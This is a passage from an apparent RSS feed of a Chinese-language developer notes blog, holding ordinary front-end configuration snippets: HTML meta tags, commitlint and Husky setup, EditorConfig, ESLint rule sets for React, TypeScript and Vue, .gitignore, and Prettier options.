    mainWindow<span>.</span>webContents<span>.</span><span>send</span><span>(</span><span>'update:error'</span><span>,</span> error<span>)</span>
  <span>}</span><span>)</span>

  autoUpdater<span>.</span><span>on</span><span>(</span><span>'download-progress'</span><span>,</span> <span>(</span><span>{</span> percent <span>}</span><span>)</span> <span>=></span> <span>{</span>
    mainWindow<span>.</span>webContents<span>.</span><span>send</span><span>(</span><span>'update:progress'</span><span>,</span> percent<span>)</span>
  <span>}</span><span>)</span>

  autoUpdater<span>.</span><span>on</span><span>(</span><span>'update-downloaded'</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    mainWindow<span>.</span>webContents<span>.</span><span>send</span><span>(</span><span>'update:downloaded'</span><span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>export</span> <span>default</span> setupUpdate
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>HTML</title>
      <link>https://www.matrixtheone.ga/web/note/HTML/</link>
      <guid>https://www.matrixtheone.ga/web/note/HTML/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">HTML</source>
      <category>HTML</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-移动端视口配置-并且不允许缩放"> 1. 移动端视口配置，并且不允许缩放</h2>
<div><pre><code><span><span><span>&lt;</span>meta</span>
  <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span>
  <span>content</span><span><span>=</span><span>"</span>width=device-width, initial-scale=1.0,maximum-scale=1.0, minimum-scale=1.0, user-scalable=no<span>"</span></span>
<span>/></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_2-ie-配置-如果安装了-gcf-google-内核渲染-则使用-gcf-来渲染页面-如果未安装-gcf-则使用最高版本的-ie-内核进行渲染"> 2. IE 配置：如果安装了 GCF（Google 内核渲染），则使用 GCF 来渲染页面，如果未安装 GCF，则使用最高版本的 IE 内核进行渲染</h2>
<div><pre><code><span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>X-UA-Compatible<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>IE=edge,chrome=1<span>"</span></span> <span>/></span></span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_3-配置全局不携带请求域"> 3. 配置全局不携带请求域</h2>
<div><pre><code><span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>referrer<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>no-referrer<span>"</span></span> <span>/></span></span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_4-双核浏览器配置"> 4. 双核浏览器配置</h2>
<div><pre><code><span>&lt;!-- 强制Chromium内核，作用于360浏览器、QQ浏览器等国产双核浏览器 --></span>
<span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>renderer<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>webkit<span>"</span></span> <span>/></span></span>

<span>&lt;!-- 强制Chromium内核，作用于其他双核浏览器 --></span>
<span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>force-rendering<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>webkit<span>"</span></span> <span>/></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_5-常用-seo-标签"> <a href="https://www.cnblogs.com/jinlonghu/articles/9553543.html" target="_blank" rel="noopener noreferrer">5. 常用 SEO 标签</a></h2>
]]></content:encoded>
    </item>
    <item>
      <title>CommitLint</title>
      <link>https://www.matrixtheone.ga/web/note/Lint/Commit-Lint/</link>
      <guid>https://www.matrixtheone.ga/web/note/Lint/Commit-Lint/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">CommitLint</source>
      <category>Lint</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-commitlintrc-js"> 1. .commitlintrc.js</h2>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>extends</span><span>:</span> <span>[</span><span>'@commitlint/config-conventional'</span><span>]</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_2-提交模板-commitizen-cz-conventional-changelog"> 2. 提交模板 commitizen &amp; cz-conventional-changelog</h2>
<blockquote>
<ol>
<li>全局安装 commitizen</li>
</ol>
</blockquote>
<div><pre><code><span>pnpm</span> i commitizen <span>-g</span>
</code></pre>
<div><span>1</span><br></div></div><blockquote>
<ol start="2">
<li>安装提交模板</li>
</ol>
</blockquote>
<div><pre><code><span>pnpm</span> i cz-conventional-changelog <span>-D</span>
</code></pre>
<div><span>1</span><br></div></div><blockquote>
<ol start="3">
<li>package.json 配置</li>
</ol>
</blockquote>
<div><pre><code><span>{</span>
  <span>"config"</span><span>:</span> <span>{</span>
    <span>"commitizen"</span><span>:</span> <span>{</span>
      <span>"path"</span><span>:</span> <span>"node_modules/cz-conventional-changelog"</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><blockquote>
<ol start="4">
<li>运行命令</li>
</ol>
</blockquote>
<div><pre><code><span>git</span> cz
</code></pre>
<div><span>1</span><br></div></div><h2 id="_3-校验钩子-husky"> 3. 校验钩子 Husky</h2>
<blockquote>
<ol>
<li>安装 Husky</li>
</ol>
</blockquote>
<div><pre><code><span>pnpm</span> i husky <span>-D</span>
</code></pre>
<div><span>1</span><br></div></div><blockquote>
<ol start="2">
<li>初始化 Husky</li>
</ol>
</blockquote>
<div><pre><code>npx husky <span>install</span>
</code></pre>
<div><span>1</span><br></div></div><blockquote>
<ol start="3">
<li>添加钩子</li>
</ol>
</blockquote>
<div><pre><code>npx husky <span>add</span> .husky/commit-msg <span>'npx --no -- commitlint --edit "$1"'</span>
</code></pre>
<div><span>1</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>EditorConfig</title>
      <link>https://www.matrixtheone.ga/web/note/Lint/Editor-Config/</link>
      <guid>https://www.matrixtheone.ga/web/note/Lint/Editor-Config/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">EditorConfig</source>
      <category>Lint</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-editorconfig"> 1. .editorconfig</h2>
<div><pre><code><span># https://editorconfig.org</span>
<span>root</span> <span><span>=</span> true</span>

<span><span>[</span><span>*</span><span>]</span></span>
<span>charset</span> <span><span>=</span> utf-8</span>
<span>indent_size</span> <span><span>=</span> 2</span>
<span>end_of_line</span> <span><span>=</span> lf</span>
<span>indent_style</span> <span><span>=</span> space</span>
<span>insert_final_newline</span> <span><span>=</span> true</span>
<span>trim_trailing_whitespace</span> <span><span>=</span> true</span>

<span><span>[</span><span>*</span>.md<span>]</span></span>
<span>insert_final_newline</span> <span><span>=</span> false</span>
<span>trim_trailing_whitespace</span> <span><span>=</span> false</span>

<span><span>[</span>Makefile<span>]</span></span>
<span>indent_style</span> <span><span>=</span> tab</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Eslintignore</title>
      <link>https://www.matrixtheone.ga/web/note/Lint/Eslint-Ignore/</link>
      <guid>https://www.matrixtheone.ga/web/note/Lint/Eslint-Ignore/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Eslintignore</source>
      <category>Lint</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-eslintignore"> 1. .eslintignore</h2>
<div><pre><code><span>tmp</span>
<span>docs</span>
<span>mock</span>
<span>dist</span>
<span>build</span>
<span>public</span>
<span>scripts</span>
<span>coverage</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Eslint</title>
      <link>https://www.matrixtheone.ga/web/note/Lint/Eslint/</link>
      <guid>https://www.matrixtheone.ga/web/note/Lint/Eslint/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Eslint</source>
      <category>Lint</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-eslintrc-js"> 1. .eslintrc.js</h2>
<div><pre><code><span>const</span> tsRules <span>=</span> <span>require</span><span>(</span><span>'./rules/tsRules'</span><span>)</span>
<span>const</span> vueRules <span>=</span> <span>require</span><span>(</span><span>'./rules/vueRules'</span><span>)</span>
<span>const</span> reactRules <span>=</span> <span>require</span><span>(</span><span>'./rules/reactRules'</span><span>)</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  <span>root</span><span>:</span> <span>true</span><span>,</span>
  <span>env</span><span>:</span> <span>{</span>
    <span>browser</span><span>:</span> <span>true</span><span>,</span>
    <span>node</span><span>:</span> <span>true</span><span>,</span>
    <span>commonjs</span><span>:</span> <span>true</span><span>,</span>
    <span>es6</span><span>:</span> <span>true</span><span>,</span>
    <span>jest</span><span>:</span> <span>true</span><span>,</span>
    <span>mocha</span><span>:</span> <span>true</span><span>,</span>
    <span>jasmine</span><span>:</span> <span>true</span><span>,</span>
    <span>jquery</span><span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
  <span>parser</span><span>:</span> <span>'@babel/eslint-parser'</span><span>,</span>
  <span>extends</span><span>:</span> <span>[</span>
    <span>'standard'</span><span>,</span>
    <span>'plugin:react/recommended'</span><span>,</span>
    <span>'plugin:react/jsx-runtime'</span><span>,</span>
    <span>'plugin:react-hooks/recommended'</span><span>,</span>
    <span>'prettier'</span><span>,</span>
  <span>]</span><span>,</span>
  <span>plugins</span><span>:</span> <span>[</span><span>'html'</span><span>,</span> <span>'react'</span><span>,</span> <span>'react-hooks'</span><span>]</span><span>,</span>
  <span>parserOptions</span><span>:</span> <span>{</span>
    <span>sourceType</span><span>:</span> <span>'module'</span><span>,</span>
    <span>ecmaVersion</span><span>:</span> <span>'latest'</span><span>,</span>
    <span>ecmaFeatures</span><span>:</span> <span>{</span> <span>jsx</span><span>:</span> <span>true</span> <span>}</span><span>,</span>
    <span>requireConfigFile</span><span>:</span> <span>false</span><span>,</span>
    <span>babelOptions</span><span>:</span> <span>{</span>
      <span>presets</span><span>:</span> <span>[</span><span>'@babel/preset-react'</span><span>]</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
  <span>settings</span><span>:</span> <span>{</span>
    <span>react</span><span>:</span> <span>{</span>
      <span>version</span><span>:</span> <span>'detect'</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
  <span>overrides</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>files</span><span>:</span> <span>[</span><span>'**/*.{ts,tsx}'</span><span>]</span><span>,</span>
      <span>parser</span><span>:</span> <span>'@typescript-eslint/parser'</span><span>,</span>
      <span>extends</span><span>:</span> <span>[</span>
        <span>'standard-with-typescript'</span><span>,</span>
        <span>'plugin:react/recommended'</span><span>,</span>
        <span>'plugin:react-hooks/recommended'</span><span>,</span>
        <span>'plugin:@typescript-eslint/recommended'</span><span>,</span>
        <span>'prettier'</span><span>,</span>
      <span>]</span><span>,</span>
      <span>plugins</span><span>:</span> <span>[</span><span>'html'</span><span>,</span> <span>'react'</span><span>,</span> <span>'react-hooks'</span><span>,</span> <span>'@typescript-eslint'</span><span>]</span><span>,</span>
      <span>parserOptions</span><span>:</span> <span>{</span>
        <span>sourceType</span><span>:</span> <span>'module'</span><span>,</span>
        <span>ecmaVersion</span><span>:</span> <span>'latest'</span><span>,</span>
        <span>ecmaFeatures</span><span>:</span> <span>{</span> <span>jsx</span><span>:</span> <span>true</span> <span>}</span><span>,</span>
        <span>requireConfigFile</span><span>:</span> <span>false</span><span>,</span>
        <span>createDefaultProgram</span><span>:</span> <span>true</span><span>,</span>
        <span>project</span><span>:</span> <span>'tsconfig.json'</span><span>,</span>
        <span>tsconfigRootDir</span><span>:</span> __dirname<span>,</span>
      <span>}</span><span>,</span>
      <span>rules</span><span>:</span> tsRules<span>,</span>
    <span>}</span><span>,</span>
    <span>{</span>
      <span>files</span><span>:</span> <span>[</span><span>'**/*.vue'</span><span>]</span><span>,</span>
      <span>parser</span><span>:</span> <span>'vue-eslint-parser'</span><span>,</span>
      <span>extends</span><span>:</span> <span>[</span><span>'standard'</span><span>,</span> <span>'plugin:vue/recommended'</span><span>,</span> <span>'prettier'</span><span>]</span><span>,</span>
      <span>plugins</span><span>:</span> <span>[</span><span>'vue'</span><span>]</span><span>,</span>
      <span>parserOptions</span><span>:</span> <span>{</span>
        <span>sourceType</span><span>:</span> <span>'module'</span><span>,</span>
        <span>ecmaVersion</span><span>:</span> <span>'latest'</span><span>,</span>
        <span>requireConfigFile</span><span>:</span> <span>false</span><span>,</span>
        <span>createDefaultProgram</span><span>:</span> <span>true</span><span>,</span>
        <span>parser</span><span>:</span> <span>'@babel/eslint-parser'</span><span>,</span>
      <span>}</span><span>,</span>
      <span>rules</span><span>:</span> vueRules<span>,</span>
    <span>}</span><span>,</span>
  <span>]</span><span>,</span>
  <span>rules</span><span>:</span> reactRules<span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br></div></div><h2 id="_2-baserules"> 2. baseRules</h2>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>'for-direction'</span><span>:</span> <span>2</span><span>,</span>
  <span>'getter-return'</span><span>:</span> <span>1</span><span>,</span>
  <span>'no-prototype-builtins'</span><span>:</span> <span>0</span><span>,</span>
  <span>'guard-for-in'</span><span>:</span> <span>0</span><span>,</span>
  <span>'no-eval'</span><span>:</span> <span>0</span><span>,</span>
  <span>'no-void'</span><span>:</span> <span>0</span><span>,</span>
  <span>'no-with'</span><span>:</span> <span>0</span><span>,</span>
  <span>'prefer-promise-reject-errors'</span><span>:</span> <span>0</span><span>,</span>
  <span>'no-unused-vars'</span><span>:</span> <span>1</span><span>,</span>
  <span>'comma-dangle'</span><span>:</span> <span>[</span><span>1</span><span>,</span> <span>'only-multiline'</span><span>]</span><span>,</span>
  <span>'no-new-object'</span><span>:</span> <span>0</span><span>,</span>
  <span>quotes</span><span>:</span> <span>[</span><span>1</span><span>,</span> <span>'single'</span><span>]</span><span>,</span>
  <span>semi</span><span>:</span> <span>[</span><span>1</span><span>,</span> <span>'never'</span><span>]</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><h2 id="_3-tsrules"> 3. tsRules</h2>
<div><pre><code><span>const</span> reactRules <span>=</span> <span>require</span><span>(</span><span>'./reactRules'</span><span>)</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  <span>...</span>reactRules<span>,</span>
  <span>'@typescript-eslint/adjacent-overload-signatures'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/ban-ts-comment'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/consistent-type-imports'</span><span>:</span> <span>[</span><span>1</span><span>,</span> <span>{</span> <span>prefer</span><span>:</span> <span>'type-imports'</span> <span>}</span><span>]</span><span>,</span>
  <span>'@typescript-eslint/explicit-function-return-type'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/no-duplicate-enum-values'</span><span>:</span> <span>1</span><span>,</span>
  <span>'@typescript-eslint/no-floating-promises'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/no-inferrable-types'</span><span>:</span> <span>1</span><span>,</span>
  <span>'@typescript-eslint/no-namespace'</span><span>:</span> <span>1</span><span>,</span>
  <span>'@typescript-eslint/no-non-null-assertion'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/no-unnecessary-qualifier'</span><span>:</span> <span>1</span><span>,</span>
  <span>'@typescript-eslint/no-unnecessary-type-arguments'</span><span>:</span> <span>1</span><span>,</span>
  <span>'@typescript-eslint/no-unsafe-argument'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/no-unsafe-assignment'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/no-unsafe-call'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/no-unsafe-member-access'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/no-unsafe-return'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/no-useless-empty-export'</span><span>:</span> <span>1</span><span>,</span>
  <span>'@typescript-eslint/no-var-requires'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/prefer-nullish-coalescing'</span><span>:</span> <span>[</span>
    <span>1</span><span>,</span>
    <span>{</span> <span>ignoreTernaryTests</span><span>:</span> <span>false</span> <span>}</span><span>,</span>
  <span>]</span><span>,</span>
  <span>'@typescript-eslint/prefer-optional-chain'</span><span>:</span> <span>1</span><span>,</span>
  <span>'@typescript-eslint/prefer-string-starts-ends-with'</span><span>:</span> <span>1</span><span>,</span>
  <span>'@typescript-eslint/require-array-sort-compare'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/restrict-template-expressions'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/strict-boolean-expressions'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/no-empty-function'</span><span>:</span> <span>0</span><span>,</span>
  <span>'@typescript-eslint/no-use-before-define'</span><span>:</span> <span>0</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br></div></div><h2 id="_4-reactrules"> 4. reactRules</h2>
<div><pre><code><span>const</span> baseRules <span>=</span> <span>require</span><span>(</span><span>'./baseRules'</span><span>)</span>

<span>const</span> reactRules <span>=</span> <span>{</span>
  <span>'react/display-name'</span><span>:</span> <span>0</span><span>,</span>
  <span>'react/no-array-index-key'</span><span>:</span> <span>1</span><span>,</span>
  <span>'react/no-arrow-function-lifecycle'</span><span>:</span> <span>1</span><span>,</span>
  <span>'react/prop-types'</span><span>:</span> <span>0</span><span>,</span>
  <span>'react/react-in-jsx-scope'</span><span>:</span> <span>0</span><span>,</span>
  <span>'react/self-closing-comp'</span><span>:</span> <span>1</span><span>,</span>
  <span>'react/style-prop-object'</span><span>:</span> <span>1</span><span>,</span>
  <span>'react/void-dom-elements-no-children'</span><span>:</span> <span>1</span><span>,</span>
  <span>'react/jsx-boolean-value'</span><span>:</span> <span>1</span><span>,</span>
  <span>'react/jsx-curly-brace-presence'</span><span>:</span> <span>1</span><span>,</span>
  <span>'react/jsx-fragments'</span><span>:</span> <span>1</span><span>,</span>
  <span>'react/jsx-key'</span><span>:</span> <span>1</span><span>,</span>
<span>}</span>

<span>const</span> reactHooksRules <span>=</span> <span>{</span>
  <span>'react-hooks/rules-of-hooks'</span><span>:</span> <span>2</span><span>,</span>
  <span>'react-hooks/exhaustive-deps'</span><span>:</span> <span>1</span><span>,</span>
<span>}</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  <span>...</span>baseRules<span>,</span>
  <span>...</span>reactRules<span>,</span>
  <span>...</span>reactHooksRules<span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div><h2 id="_5-vuerules"> 5. vueRules</h2>
<div><pre><code><span>const</span> baseRules <span>=</span> <span>require</span><span>(</span><span>'./baseRules'</span><span>)</span>

<span>const</span> vueRules <span>=</span> <span>{</span>
  <span>'vue/multi-word-component-names'</span><span>:</span> <span>0</span><span>,</span>
  <span>'vue/no-unused-vars'</span><span>:</span> <span>[</span>
    <span>2</span><span>,</span>
    <span>{</span>
      <span>ignorePattern</span><span>:</span> <span>'^_'</span><span>,</span>
    <span>}</span><span>,</span>
  <span>]</span><span>,</span>
  <span>'vue/html-self-closing'</span><span>:</span> <span>[</span>
    <span>2</span><span>,</span>
    <span>{</span>
      <span>html</span><span>:</span> <span>{</span>
        <span>void</span><span>:</span> <span>'always'</span><span>,</span>
        <span>normal</span><span>:</span> <span>'always'</span><span>,</span>
        <span>component</span><span>:</span> <span>'always'</span><span>,</span>
      <span>}</span><span>,</span>
      <span>svg</span><span>:</span> <span>'always'</span><span>,</span>
      <span>math</span><span>:</span> <span>'always'</span><span>,</span>
    <span>}</span><span>,</span>
  <span>]</span><span>,</span>
  <span>'vue/no-template-shadow'</span><span>:</span> <span>2</span><span>,</span>
  <span>'vue/no-v-html'</span><span>:</span> <span>1</span><span>,</span>
  <span>'vue/no-potential-component-option-typo'</span><span>:</span> <span>[</span>
    <span>2</span><span>,</span>
    <span>{</span>
      <span>presets</span><span>:</span> <span>[</span><span>'all'</span><span>]</span><span>,</span>
    <span>}</span><span>,</span>
  <span>]</span><span>,</span>
  <span>'vue/no-useless-mustaches'</span><span>:</span> <span>1</span><span>,</span>
  <span>'vue/no-unused-refs'</span><span>:</span> <span>1</span><span>,</span>
  <span>'vue/no-unused-properties'</span><span>:</span> <span>1</span><span>,</span>
  <span>'vue/no-undef-properties'</span><span>:</span> <span>1</span><span>,</span>
  <span>'vue/no-undef-components'</span><span>:</span> <span>1</span><span>,</span>
  <span>'vue/no-this-in-before-route-enter'</span><span>:</span> <span>1</span><span>,</span>
  <span>'vue/no-template-target-blank'</span><span>:</span> <span>1</span><span>,</span>
  <span>'vue/v-on-function-call'</span><span>:</span> <span>1</span><span>,</span>
  <span>'vue/require-name-property'</span><span>:</span> <span>1</span><span>,</span>
  <span>'vue/require-direct-export'</span><span>:</span> <span>1</span><span>,</span>
  <span>'vue/prefer-true-attribute-shorthand'</span><span>:</span> <span>1</span><span>,</span>
  <span>'vue/prefer-separate-static-class'</span><span>:</span> <span>1</span><span>,</span>
<span>}</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  <span>...</span>baseRules<span>,</span>
  <span>...</span>vueRules<span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Gitignore</title>
      <link>https://www.matrixtheone.ga/web/note/Lint/Git-Ignore/</link>
      <guid>https://www.matrixtheone.ga/web/note/Lint/Git-Ignore/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Gitignore</source>
      <category>Lint</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-gitignore"> 1. .gitignore</h2>
<div><pre><code><span>.node</span>
<span>.idea</span>
<span>.cache</span>
<span>.vscode</span>
<span>.history</span>
<span>.DS_Store</span>
<span>.eslintcache</span>
<span>.stylelintcache</span>

<span>dist</span>
<span>build</span>
<span>coverage</span>
<span>node_modules</span>

<span>temp</span>
<span>debug</span>
<span><span>*</span>.log<span>*</span></span>

<span>yarn.lock</span>
<span>pnpm-lock.yaml</span>
<span>package-lock.json</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Npm</title>
      <link>https://www.matrixtheone.ga/web/note/Lint/Npm/</link>
      <guid>https://www.matrixtheone.ga/web/note/Lint/Npm/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Npm</source>
      <category>Lint</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>Prettier</title>
      <link>https://www.matrixtheone.ga/web/note/Lint/Prettier/</link>
      <guid>https://www.matrixtheone.ga/web/note/Lint/Prettier/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Prettier</source>
      <category>Lint</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-prettierrc-js"> 1. .prettierrc.js</h2>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>semi</span><span>:</span> <span>false</span><span>,</span>
  <span>singleQuote</span><span>:</span> <span>true</span><span>,</span>
  <span>jsxSingleQuote</span><span>:</span> <span>true</span><span>,</span>
  <span>endOfLine</span><span>:</span> <span>'lf'</span><span>,</span>
  <span>proseWrap</span><span>:</span> <span>'never'</span><span>,</span>
  <span>arrowParens</span><span>:</span> <span>'always'</span><span>,</span>
  <span>trailingComma</span><span>:</span> <span>'all'</span><span>,</span>
  <span>plugins</span><span>:</span> <span>[</span>
    require<span>.</span><span>resolve</span><span>(</span><span>'prettier-plugin-packagejson'</span><span>)</span><span>,</span>
    require<span>.</span><span>resolve</span><span>(</span><span>'@trivago/prettier-plugin-sort-imports'</span><span>)</span><span>,</span>
  <span>]</span><span>,</span>
  <span>importOrderSortSpecifiers</span><span>:</span> <span>true</span><span>,</span>
  <span>importOrderCaseInsensitive</span><span>:</span> <span>true</span><span>,</span>
  <span>importOrder</span><span>:</span> <span>[</span>
    <span>'^(react|vue)(.*)$'</span><span>,</span>
    <span>'^umi(.*)$'</span><span>,</span>
    <span>'^antd(.*)$'</span><span>,</span>
    <span>'^@?ant-design(.*)$'</span><span>,</span>
    <span>'^@?element(.*)$'</span><span>,</span>
    <span>'&lt;THIRD_PARTY_MODULES>'</span><span>,</span>
    <span>'^@/components(.*)$'</span><span>,</span>
    <span>'^@/models(.*)$'</span><span>,</span>
    <span>'^@/assets(.*)$'</span><span>,</span>
    <span>'^@/common(.*)$'</span><span>,</span>
    <span>'^@/constant(.*)$'</span><span>,</span>
    <span>'^@/services(.*)$'</span><span>,</span>
    <span>'^@/hooks(.*)$'</span><span>,</span>
